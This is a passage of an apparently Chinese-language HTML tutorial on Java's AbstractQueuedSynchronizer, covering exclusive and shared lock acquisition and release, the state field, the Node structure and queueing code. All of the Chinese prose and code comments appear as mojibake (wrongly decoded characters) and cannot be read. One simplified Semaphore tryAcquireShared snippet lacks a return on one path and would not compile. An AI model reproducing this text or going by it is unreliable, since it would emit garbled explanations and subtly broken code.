<li>å…¶ä»–çº¿ç¨‹å¿…é¡»ç­‰å¾…å½“å‰çº¿ç¨‹é‡Šæ”¾é”</li>
<li>å…¸å‹åº”ç”¨ï¼šReentrantLock</li>
</ul>
<h5 data-id="heading-124">tryAcquireï¼ˆå°è¯•è·å–é”ï¼‰</h5>
<p><strong>æ–¹æ³•å®šä¹‰ï¼š</strong> å­ç±»éœ€è¦å®ç°è¿™ä¸ªæ–¹æ³•ï¼Œå®šä¹‰å¦‚ä½•è·å–é”ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AQSä¸­çš„æŠ½è±¡æ–¹æ³•ï¼Œå­ç±»å¿…é¡»å®ç°</span>
<span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();
}
</code></pre>
<p><strong>ReentrantLockçš„å®ç°é€»è¾‘ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">state</span> <span class="hljs-operator">=</span> getState();  <span class="hljs-comment">// è·å–å½“å‰çŠ¶æ€</span>
    
    <span class="hljs-keyword">if</span> (state == <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// é”ç©ºé—²ï¼Œå°è¯•CASè·å–</span>
        <span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)) {
            setExclusiveOwnerThread(Thread.currentThread());
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// è·å–æˆåŠŸ</span>
        }
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isCurrentThreadOwner()) {
        <span class="hljs-comment">// å¯é‡å…¥ï¼šå½“å‰çº¿ç¨‹å·²æŒæœ‰é”ï¼Œstate+1</span>
        setState(state + <span class="hljs-number">1</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// è·å–å¤±è´¥</span>
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ol>
<li>æ£€æŸ¥é”æ˜¯å¦ç©ºé—²ï¼ˆstate == 0ï¼‰</li>
<li>å¦‚æœç©ºé—²ï¼ŒCASå°è¯•è·å–é”</li>
<li>å¦‚æœå½“å‰çº¿ç¨‹å·²æŒæœ‰é”ï¼Œæ”¯æŒå¯é‡å…¥</li>
<li>è¿”å›trueè¡¨ç¤ºè·å–æˆåŠŸï¼Œfalseè¡¨ç¤ºå¤±è´¥</li>
</ol>
<h5 data-id="heading-125">tryReleaseï¼ˆå°è¯•é‡Šæ”¾é”ï¼‰</h5>
<p><strong>æ–¹æ³•å®šä¹‰ï¼š</strong> å­ç±»éœ€è¦å®ç°è¿™ä¸ªæ–¹æ³•ï¼Œå®šä¹‰å¦‚ä½•é‡Šæ”¾é”ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AQSä¸­çš„æŠ½è±¡æ–¹æ³•ï¼Œå­ç±»å¿…é¡»å®ç°</span>
<span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();
}
</code></pre>
<p><strong>ReentrantLockçš„å®ç°é€»è¾‘ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">newState</span> <span class="hljs-operator">=</span> getState() - releases;  <span class="hljs-comment">// çŠ¶æ€å‡1</span>
    
    <span class="hljs-keyword">if</span> (Thread.currentThread() != getExclusiveOwnerThread())
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>();  <span class="hljs-comment">// åªæœ‰æŒæœ‰é”çš„çº¿ç¨‹æ‰èƒ½é‡Šæ”¾</span>
    
    <span class="hljs-keyword">if</span> (newState == <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// å®Œå…¨é‡Šæ”¾é”</span>
        setExclusiveOwnerThread(<span class="hljs-literal">null</span>);
        setState(<span class="hljs-number">0</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// è¿˜æœ‰é‡å…¥æ¬¡æ•°ï¼Œåªæ›´æ–°state</span>
        setState(newState);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ol>
<li>æ£€æŸ¥æ˜¯å¦æ˜¯æŒæœ‰é”çš„çº¿ç¨‹ï¼ˆé˜²æ­¢éæ³•é‡Šæ”¾ï¼‰</li>
<li>stateå‡1</li>
<li>å¦‚æœstateå˜ä¸º0ï¼Œå®Œå…¨é‡Šæ”¾é”</li>
<li>è¿”å›trueè¡¨ç¤ºé”å·²å®Œå…¨é‡Šæ”¾ï¼Œfalseè¡¨ç¤ºè¿˜æœ‰é‡å…¥æ¬¡æ•°</li>
</ol>
<h4 data-id="heading-126">tryAcquireShared/tryReleaseSharedï¼ˆå…±äº«æ¨¡å¼ï¼‰</h4>
<p><strong>å…±äº«æ¨¡å¼ï¼ˆSharedï¼‰ï¼š</strong> å¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶è·å–é”ã€‚</p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>å…±äº«æ¨¡å¼å°±åƒå›¾ä¹¦é¦†ï¼Œå¤šä¸ªäººå¯ä»¥åŒæ—¶è¿›å…¥</li>
<li>stateè¡¨ç¤ºå¯ç”¨èµ„æºæ•°é‡</li>
<li>å…¸å‹åº”ç”¨ï¼šSemaphoreï¼ˆä¿¡å·é‡ï¼‰ã€ReadWriteLockçš„è¯»é”</li>
</ul>
<h5 data-id="heading-127">tryAcquireSharedï¼ˆå°è¯•è·å–å…±äº«é”ï¼‰</h5>
<p><strong>æ–¹æ³•å®šä¹‰ï¼š</strong> å­ç±»éœ€è¦å®ç°è¿™ä¸ªæ–¹æ³•ï¼Œå®šä¹‰å¦‚ä½•è·å–å…±äº«é”ã€‚</p>
<p><strong>è¿”å›å€¼å«ä¹‰ï¼š</strong></p>
<ul>
<li><strong>è´Ÿæ•°</strong>ï¼šè·å–å¤±è´¥</li>
<li><strong>0</strong>ï¼šè·å–æˆåŠŸï¼Œä½†æ²¡æœ‰å‰©ä½™èµ„æºäº†</li>
<li><strong>æ­£æ•°</strong>ï¼šè·å–æˆåŠŸï¼Œè¿˜æœ‰å‰©ä½™èµ„æº</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AQSä¸­çš„æŠ½è±¡æ–¹æ³•</span>
<span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">tryAcquireShared</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();
}
</code></pre>
<p><strong>Semaphoreçš„å®ç°é€»è¾‘ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">tryAcquireShared</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">available</span> <span class="hljs-operator">=</span> getState();        <span class="hljs-comment">// è·å–å¯ç”¨è®¸å¯è¯æ•°</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">remaining</span> <span class="hljs-operator">=</span> available - acquires;  <span class="hljs-comment">// è®¡ç®—å‰©ä½™æ•°é‡</span>
    
    <span class="hljs-comment">// èµ„æºä¸è¶³ï¼ˆremaining &lt; 0ï¼‰æˆ–CASæˆåŠŸ</span>
    <span class="hljs-keyword">if</span> (remaining &lt; <span class="hljs-number">0</span> || compareAndSetState(available, remaining))
        <span class="hljs-keyword">return</span> remaining;  <span class="hljs-comment">// è¿”å›å‰©ä½™æ•°é‡</span>
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ol>
<li>stateè¡¨ç¤ºå¯ç”¨èµ„æºæ•°é‡ï¼ˆå¦‚Semaphoreçš„è®¸å¯è¯æ•°ï¼‰</li>
<li>å°è¯•è·å–æŒ‡å®šæ•°é‡çš„èµ„æº</li>
<li>å¦‚æœèµ„æºè¶³å¤Ÿï¼ŒCASæ›´æ–°state</li>
<li>è¿”å›å‰©ä½™èµ„æºæ•°é‡</li>
</ol>
<h5 data-id="heading-128">tryReleaseSharedï¼ˆå°è¯•é‡Šæ”¾å…±äº«é”ï¼‰</h5>
<p><strong>æ–¹æ³•å®šä¹‰ï¼š</strong> å­ç±»éœ€è¦å®ç°è¿™ä¸ªæ–¹æ³•ï¼Œå®šä¹‰å¦‚ä½•é‡Šæ”¾å…±äº«é”ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AQSä¸­çš„æŠ½è±¡æ–¹æ³•</span>
<span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryReleaseShared</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();
}
</code></pre>
<p><strong>Semaphoreçš„å®ç°é€»è¾‘ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryReleaseShared</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
    <span class="hljs-keyword">for</span> (;;) {
        <span class="hljs-type">int</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> getState();      <span class="hljs-comment">// å½“å‰èµ„æºæ•°</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">next</span> <span class="hljs-operator">=</span> current + releases; <span class="hljs-comment">// é‡Šæ”¾åçš„èµ„æºæ•°</span>
        
        <span class="hljs-keyword">if</span> (compareAndSetState(current, next))
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// é‡Šæ”¾æˆåŠŸ</span>
        <span class="hljs-comment">// CASå¤±è´¥ï¼Œè‡ªæ—‹é‡è¯•</span>
    }
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ol>
<li>é‡Šæ”¾æŒ‡å®šæ•°é‡çš„èµ„æº</li>
<li>stateå¢åŠ </li>
<li>ä½¿ç”¨CASæ›´æ–°ï¼Œå¤±è´¥åˆ™è‡ªæ—‹é‡è¯•</li>
<li>è¿”å›trueè¡¨ç¤ºé‡Šæ”¾æˆåŠŸ</li>
</ol>
<h4 data-id="heading-129">acquire/acquireSharedï¼ˆè·å–é”çš„æ ¸å¿ƒæµç¨‹ï¼‰</h4>
<p><strong>è¿™äº›æ–¹æ³•æ˜¯AQSæä¾›çš„æ¨¡æ¿æ–¹æ³•ï¼Œå®ç°äº†å®Œæ•´çš„è·å–é”æµç¨‹ã€‚</strong></p>
<h5 data-id="heading-130">acquireï¼ˆç‹¬å æ¨¡å¼è·å–é”ï¼‰</h5>
<p><strong>æ–¹æ³•ä½œç”¨ï¼š</strong> ç‹¬å æ¨¡å¼ä¸‹è·å–é”çš„å®Œæ•´æµç¨‹ï¼ŒåŒ…æ‹¬å°è¯•è·å–ã€å…¥é˜Ÿã€é˜»å¡ç­‰ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acquire</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-comment">// æ­¥éª¤1ï¼šå°è¯•è·å–é”</span>
    <span class="hljs-keyword">if</span> (!tryAcquire(arg) &amp;&amp;
        <span class="hljs-comment">// æ­¥éª¤2ï¼šå¤±è´¥åˆ™åŠ å…¥é˜Ÿåˆ—å¹¶è‡ªæ—‹å°è¯•</span>
        acquireQueued(addWaiter(Node.EXCLUSIVE), arg))
        <span class="hljs-comment">// æ­¥éª¤3ï¼šå¦‚æœè¢«ä¸­æ–­ï¼Œæ¢å¤ä¸­æ–­çŠ¶æ€</span>
        selfInterrupt();
}
</code></pre>
<p><strong>æ‰§è¡Œæµç¨‹è¯¦è§£ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-number">1</span>. <span class="hljs-built_in">tryAcquire</span>(arg)
   â”œâ”€ æˆåŠŸ â†’ ç›´æ¥è¿”å›ï¼Œè·å–é”æˆåŠŸ
   â””â”€ å¤±è´¥ â†“

<span class="hljs-number">2</span>. <span class="hljs-built_in">addWaiter</span>(Node.EXCLUSIVE)
   â””â”€ åˆ›å»ºèŠ‚ç‚¹ï¼ŒåŠ å…¥ç­‰å¾…é˜Ÿåˆ—

<span class="hljs-number">3</span>. <span class="hljs-built_in">acquireQueued</span>(node, arg)
   â”œâ”€ è‡ªæ—‹å°è¯•è·å–é”
   â”œâ”€ æˆåŠŸ â†’ è¿”å›falseï¼Œè·å–é”æˆåŠŸ
   â””â”€ å¤±è´¥ â†’ é˜»å¡çº¿ç¨‹ï¼Œç­‰å¾…è¢«å”¤é†’

<span class="hljs-number">4</span>. <span class="hljs-built_in">selfInterrupt</span>()
   â””â”€ å¦‚æœè¢«ä¸­æ–­è¿‡ï¼Œæ¢å¤ä¸­æ–­çŠ¶æ€
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>å…ˆå°è¯•å¿«é€Ÿè·å–é”ï¼ˆtryAcquireï¼‰</li>
<li>å¤±è´¥åˆ™åŠ å…¥ç­‰å¾…é˜Ÿåˆ—</li>
<li>åœ¨é˜Ÿåˆ—ä¸­è‡ªæ—‹å°è¯•ï¼Œè¿˜ä¸è¡Œå°±é˜»å¡</li>
<li>ç­‰å¾…å…¶ä»–çº¿ç¨‹é‡Šæ”¾é”åå”¤é†’</li>
</ul>
<h5 data-id="heading-131">acquireSharedï¼ˆå…±äº«æ¨¡å¼è·å–é”ï¼‰</h5>
<p><strong>æ–¹æ³•ä½œç”¨ï¼š</strong> å…±äº«æ¨¡å¼ä¸‹è·å–é”çš„å®Œæ•´æµç¨‹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acquireShared</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-comment">// tryAcquireSharedè¿”å›å€¼ &lt; 0 è¡¨ç¤ºè·å–å¤±è´¥</span>
    <span class="hljs-keyword">if</span> (tryAcquireShared(arg) &lt; <span class="hljs-number">0</span>)
        doAcquireShared(arg);  <span class="hljs-comment">// å¤±è´¥åˆ™è¿›å…¥å…±äº«æ¨¡å¼è·å–æµç¨‹</span>
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>å°è¯•è·å–å…±äº«èµ„æº</li>
<li>è¿”å›å€¼å°äº0è¡¨ç¤ºèµ„æºä¸è¶³</li>
<li>å¤±è´¥åˆ™è¿›å…¥é˜Ÿåˆ—ç­‰å¾…</li>
</ul>
<h4 data-id="heading-132">release/releaseSharedï¼ˆé‡Šæ”¾é”çš„æ ¸å¿ƒæµç¨‹ï¼‰</h4>
<p><strong>è¿™äº›æ–¹æ³•å®ç°äº†å®Œæ•´çš„é‡Šæ”¾é”æµç¨‹ï¼ŒåŒ…æ‹¬å”¤é†’ç­‰å¾…çº¿ç¨‹ã€‚</strong></p>
<h5 data-id="heading-133">releaseï¼ˆç‹¬å æ¨¡å¼é‡Šæ”¾é”ï¼‰</h5>
<p><strong>æ–¹æ³•ä½œç”¨ï¼š</strong> ç‹¬å æ¨¡å¼ä¸‹é‡Šæ”¾é”ï¼Œå¹¶å”¤é†’ç­‰å¾…é˜Ÿåˆ—ä¸­çš„çº¿ç¨‹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">release</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">if</span> (tryRelease(arg)) {  <span class="hljs-comment">// æ­¥éª¤1ï¼šå°è¯•é‡Šæ”¾é”</span>
        <span class="hljs-type">Node</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> head;
        <span class="hljs-comment">// æ­¥éª¤2ï¼šå¦‚æœé˜Ÿåˆ—ä¸­æœ‰ç­‰å¾…çš„çº¿ç¨‹ï¼Œå”¤é†’ä¸‹ä¸€ä¸ª</span>
        <span class="hljs-keyword">if</span> (h != <span class="hljs-literal">null</span> &amp;&amp; h.waitStatus != <span class="hljs-number">0</span>)
            unparkSuccessor(h);  <span class="hljs-comment">// å”¤é†’åç»§èŠ‚ç‚¹</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// é‡Šæ”¾å¤±è´¥ï¼ˆè¿˜æœ‰é‡å…¥æ¬¡æ•°ï¼‰</span>
}
</code></pre>
<p><strong>æ‰§è¡Œæµç¨‹è¯¦è§£ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-number">1</span>. <span class="hljs-built_in">tryRelease</span>(arg)
   â”œâ”€ æˆåŠŸï¼ˆå®Œå…¨é‡Šæ”¾ï¼‰ â†’ ç»§ç»­ä¸‹ä¸€æ­¥
   â””â”€ å¤±è´¥ï¼ˆè¿˜æœ‰é‡å…¥ï¼‰ â†’ è¿”å›false

<span class="hljs-number">2</span>. <span class="hljs-built_in">unparkSuccessor</span>(h)
   â””â”€ å”¤é†’ç­‰å¾…é˜Ÿåˆ—ä¸­çš„ä¸‹ä¸€ä¸ªçº¿ç¨‹
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>å°è¯•é‡Šæ”¾é”</li>
<li>å¦‚æœå®Œå…¨é‡Šæ”¾ï¼Œå”¤é†’é˜Ÿåˆ—ä¸­çš„ä¸‹ä¸€ä¸ªçº¿ç¨‹</li>
<li>è®©ç­‰å¾…çš„çº¿ç¨‹æœ‰æœºä¼šè·å–é”</li>
</ul>
<h5 data-id="heading-134">releaseSharedï¼ˆå…±äº«æ¨¡å¼é‡Šæ”¾é”ï¼‰</h5>
<p><strong>æ–¹æ³•ä½œç”¨ï¼š</strong> å…±äº«æ¨¡å¼ä¸‹é‡Šæ”¾èµ„æºï¼Œå¹¶å”¤é†’ç­‰å¾…çš„çº¿ç¨‹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">releaseShared</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">if</span> (tryReleaseShared(arg)) {  <span class="hljs-comment">// å°è¯•é‡Šæ”¾èµ„æº</span>
        doReleaseShared();  <span class="hljs-comment">// å”¤é†’ç­‰å¾…çš„çº¿ç¨‹ï¼ˆå¯èƒ½å¤šä¸ªï¼‰</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>é‡Šæ”¾å…±äº«èµ„æº</li>
<li>å”¤é†’æ‰€æœ‰ç­‰å¾…è¯¥èµ„æºçš„çº¿ç¨‹</li>
<li>å¤šä¸ªçº¿ç¨‹å¯èƒ½åŒæ—¶è¢«å”¤é†’ï¼ˆå› ä¸ºå…±äº«æ¨¡å¼å…è®¸å¤šä¸ªçº¿ç¨‹åŒæ—¶è·å–ï¼‰</li>
</ul>
<h3 data-id="heading-135">6.3 AQSçš„å®ç°åŸç†</h3>
<h4 data-id="heading-136">çŠ¶æ€å˜é‡state</h4>
<p><strong>stateçš„ä½œç”¨ï¼š</strong></p>
<ul>
<li>è¡¨ç¤ºåŒæ­¥çŠ¶æ€</li>
<li>åœ¨ä¸åŒåŒæ­¥å™¨ä¸­æœ‰ä¸åŒå«ä¹‰ï¼š
<ul>
<li>ReentrantLockï¼šè¡¨ç¤ºé‡å…¥æ¬¡æ•°</li>
<li>Semaphoreï¼šè¡¨ç¤ºå¯ç”¨è®¸å¯è¯æ•°é‡</li>
<li>CountDownLatchï¼šè¡¨ç¤ºè®¡æ•°å™¨å€¼</li>
<li>ReentrantReadWriteLockï¼šé«˜16ä½è¡¨ç¤ºè¯»é”ï¼Œä½16ä½è¡¨ç¤ºå†™é”</li>
</ul>
</li>
</ul>
<p><strong>stateçš„è®¿é—®ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è·å–state</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getState</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> state;
}

<span class="hljs-comment">// è®¾ç½®state</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setState</span><span class="hljs-params">(<span class="hljs-type">int</span> newState)</span> {
    state = newState;
}

<span class="hljs-comment">// CASæ›´æ–°state</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSetState</span><span class="hljs-params">(<span class="hljs-type">int</span> expect, <span class="hljs-type">int</span> update)</span> {
    <span class="hljs-keyword">return</span> unsafe.compareAndSwapInt(<span class="hljs-built_in">this</span>, stateOffset, expect, update);
}
</code></pre>
<h4 data-id="heading-137">èŠ‚ç‚¹Nodeç»“æ„</h4>
<p><strong>NodeèŠ‚ç‚¹è¯¦è§£ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> {
    <span class="hljs-comment">// æ ‡è®°èŠ‚ç‚¹ä¸ºå…±äº«æ¨¡å¼</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">SHARED</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
    <span class="hljs-comment">// æ ‡è®°èŠ‚ç‚¹ä¸ºç‹¬å æ¨¡å¼</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">EXCLUSIVE</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
    
    <span class="hljs-comment">// ç­‰å¾…çŠ¶æ€å€¼</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CANCELLED</span> <span class="hljs-operator">=</span>  <span class="hljs-number">1</span>;  <span class="hljs-comment">// èŠ‚ç‚¹å·²å–æ¶ˆ</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SIGNAL</span>    <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;  <span class="hljs-comment">// åç»§èŠ‚ç‚¹éœ€è¦è¢«å”¤é†’</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CONDITION</span> <span class="hljs-operator">=</span> -<span class="hljs-number">2</span>;  <span class="hljs-comment">// èŠ‚ç‚¹åœ¨æ¡ä»¶é˜Ÿåˆ—ä¸­ç­‰å¾…</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">PROPAGATE</span> <span class="hljs-operator">=</span> -<span class="hljs-number">3</span>;  <span class="hljs-comment">// å…±äº«æ¨¡å¼ä¸‹éœ€è¦ä¼ æ’­</span>
    
    <span class="hljs-comment">// ç­‰å¾…çŠ¶æ€ï¼ˆvolatileä¿è¯å¯è§æ€§ï¼‰</span>
    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> waitStatus;
    
    <span class="hljs-comment">// å‰é©±èŠ‚ç‚¹</span>
    <span class="hljs-keyword">volatile</span> Node prev;
    
    <span class="hljs-comment">// åç»§èŠ‚ç‚¹</span>
    <span class="hljs-keyword">volatile</span> Node next;
    
    <span class="hljs-comment">// èŠ‚ç‚¹å¯¹åº”çš„çº¿ç¨‹</span>
    <span class="hljs-keyword">volatile</span> Thread thread;
    
    <span class="hljs-comment">// ä¸‹ä¸€ä¸ªç­‰å¾…èŠ‚ç‚¹ï¼ˆç”¨äºæ¡ä»¶é˜Ÿåˆ—ï¼‰</span>
    Node nextWaiter;
}
</code></pre>
<h4 data-id="heading-138">å…¥é˜Ÿå’Œå‡ºé˜Ÿæ“ä½œ</h4>
<h5 data-id="heading-139">å…¥é˜Ÿï¼ˆaddWaiterï¼‰</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Node <span class="hljs-title function_">addWaiter</span><span class="hljs-params">(Node mode)</span> {
    <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(Thread.currentThread(), mode);
    <span class="hljs-type">Node</span> <span class="hljs-variable">pred</span> <span class="hljs-operator">=</span> tail;
    
    <span class="hljs-comment">// å¿«é€Ÿè·¯å¾„ï¼šé˜Ÿåˆ—ä¸ä¸ºç©ºï¼ŒCASæ·»åŠ åˆ°é˜Ÿå°¾</span>
    <span class="hljs-keyword">if</span> (pred != <span class="hljs-literal">null</span>) {
        node.prev = pred;
        <span class="hljs-keyword">if</span> (compareAndSetTail(pred, node)) {
            pred.next = node;
            <span class="hljs-keyword">return</span> node;
        }
    }
    
    <span class="hljs-comment">// æ…¢é€Ÿè·¯å¾„ï¼šé˜Ÿåˆ—ä¸ºç©ºæˆ–CASå¤±è´¥ï¼Œå®Œæ•´å…¥é˜Ÿ</span>
    enq(node);
    <span class="hljs-keyword">return</span> node;
}

<span class="hljs-keyword">private</span> Node <span class="hljs-title function_">enq</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Node node)</span> {
    <span class="hljs-keyword">for</span> (;;) {
        <span class="hljs-type">Node</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> tail;
        <span class="hljs-keyword">if</span> (t == <span class="hljs-literal">null</span>) { <span class="hljs-comment">// é˜Ÿåˆ—ä¸ºç©ºï¼Œåˆå§‹åŒ–</span>
            <span class="hljs-keyword">if</span> (compareAndSetHead(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>()))
                tail = head;
        } <span class="hljs-keyword">else</span> {
            node.prev = t;
            <span class="hljs-keyword">if</span> (compareAndSetTail(t, node)) {
                t.next = node;
                <span class="hljs-keyword">return</span> t;
            }
        }
    }
}
</code></pre>
<h5 data-id="heading-140">å‡ºé˜Ÿï¼ˆunparkSuccessorï¼‰</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unparkSuccessor</span><span class="hljs-params">(Node node)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">ws</span> <span class="hljs-operator">=</span> node.waitStatus;
    <span class="hljs-keyword">if</span> (ws &lt; <span class="hljs-number">0</span>)
        compareAndSetWaitStatus(node, ws, <span class="hljs-number">0</span>);
    
    <span class="hljs-type">Node</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> node.next;
    <span class="hljs-comment">// æ‰¾åˆ°ä¸‹ä¸€ä¸ªéœ€è¦å”¤é†’çš„èŠ‚ç‚¹</span>
    <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span> || s.waitStatus &gt; <span class="hljs-number">0</span>) {
        s = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">Node</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> tail; t != <span class="hljs-literal">null</span> &amp;&amp; t != node; t = t.prev)
            <span class="hljs-keyword">if</span> (t.waitStatus &lt;= <span class="hljs-number">0</span>)
                s = t;
    }
    <span class="hljs-keyword">if</span> (s != <span class="hljs-literal">null</span>)
        LockSupport.unpark(s.thread); <span class="hljs-comment">// å”¤é†’çº¿ç¨‹</span>
}
</code></pre>
<h4 data-id="heading-141">è‡ªæ—‹å’Œé˜»å¡</h4>
<h5 data-id="heading-142">acquireQueuedï¼ˆè‡ªæ—‹è·å–é”ï¼‰</h5>
